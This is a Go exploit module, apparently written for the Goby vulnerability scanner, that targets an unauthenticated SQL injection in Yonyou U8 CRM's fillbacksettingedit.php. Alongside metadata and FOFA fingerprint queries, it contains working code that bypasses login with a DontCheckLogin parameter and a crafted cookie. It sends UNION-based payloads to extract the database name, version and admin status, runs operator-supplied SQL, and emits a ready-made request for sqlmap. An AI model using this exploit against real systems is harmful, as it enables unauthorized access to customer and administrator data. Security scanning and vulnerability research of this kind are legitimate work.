package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yonyou-U8CRM /fillbacksettingedit.php SQL Injection Vulnerability",
    "Description": "<p>Yonyou U8 CRM is a professional enterprise-level CRM software designed to help enterprises efficiently manage customer relationships, improve sales performance and provide high-quality customer service. </p><p>fillbacksettingedit.php In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Product": "yonyou-U8CRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-09-26",
    "PostTime": "2024-10-10",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"/js/UTU.js\" && body=\"/js/turboui.js\"",
    "GobyQuery": "body=\"/js/UTU.js\" && body=\"/js/turboui.js\"",
    "Level": "1",
    "Impact": "<p>fillbacksettingedit.php In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142555635"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,is_admin",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "1 UNION ALL SELECT NULL,NULL,NULL,NULL,6*111,NULL,NULL--+",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "用友U8 CRM /fillbacksettingedit.php SQL 注入漏洞",
            "Product": "用友U8CRM",
            "Description": "<p>用友U8 CRM 客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。<br></p><p>用友 U8 CRM客户关系管理系统 config/fillbacksettingedit.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>用友 U8 CRM客户关系管理系统 config/fillbacksettingedit.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "yonyou-U8CRM /fillbacksettingedit.php SQL Injection Vulnerability",
            "Product": "yonyou-U8CRM",
            "Description": "<p>Yonyou U8 CRM is a professional enterprise-level CRM software designed to help enterprises efficiently manage customer relationships, improve sales performance and provide high-quality customer service.&nbsp;</p><p>fillbacksettingedit.php In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>fillbacksettingedit.php In addition to exploiting the SQL injection vulnerability to obtain information in the database (for example, administrator background password, site user personal information), the attacker can even write a Trojan to the server in the case of high privilege to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9959"
}`
	setSqlPayloadHashascioasjifuhayusghfugasdtfgiasyuhfigastifchjasyfga := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, url string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(url)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		urlget := "/config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=" + url.QueryEscape(sql)

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{"Cookie": "PHPSESSID=bgsesstimeout-;"})
		if err != nil || resp.StatusCode != 500 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/config/fillbacksettingedit.php"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "35906355"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "1 UNION ALL SELECT NULL,NULL,NULL,NULL,6345*5659,NULL,NULL--+"

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `"src_fld":([\s\S]*?),`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashascioasjifuhayusghfugasdtfgiasyuhfigastifchjasyfga
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
      // expResult.HostInfo.HostInfo
			sqlpoint := `GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2C6345%2A5659%2CNULL%2CNULL--%2B HTTP/1.1
Host: `+expResult.HostInfo.HostInfo+`
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Cookie: PHPSESSID=bgsesstimeout-;
Accept-Encoding: gzip
`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `"src_fld":([\s\S]*?),`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashascioasjifuhayusghfugasdtfgiasyuhfigastifchjasyfga
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
        sql:= ""
        if attacktype == "custom" {
				  sql = goutils.B2S(ss.Params["custom"])
        }else{
          way := goutils.B2S(ss.Params["default"])
          if way == "db_name" {
            sql = "1 UNION ALL SELECT NULL,NULL,NULL,NULL,DB_NAME(),NULL,NULL--+"
          }else if way == "db_version" {
            sql = "1 UNION ALL SELECT NULL,NULL,NULL,NULL,@@version,NULL,NULL--+"
          }else if way == "user_name" {
            sql = "1 UNION ALL SELECT NULL,NULL,NULL,NULL,USER(),NULL,NULL--+"
          }else if way == "is_admin" {
            sql = "1 UNION ALL SELECT NULL,NULL,NULL,NULL,IS_SRVROLEMEMBER('sysadmin'),NULL,NULL--+"
          }
        }
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
          return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
          return expResult
				}
				expResult.Success = true
				expResult.Output = output
      }else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
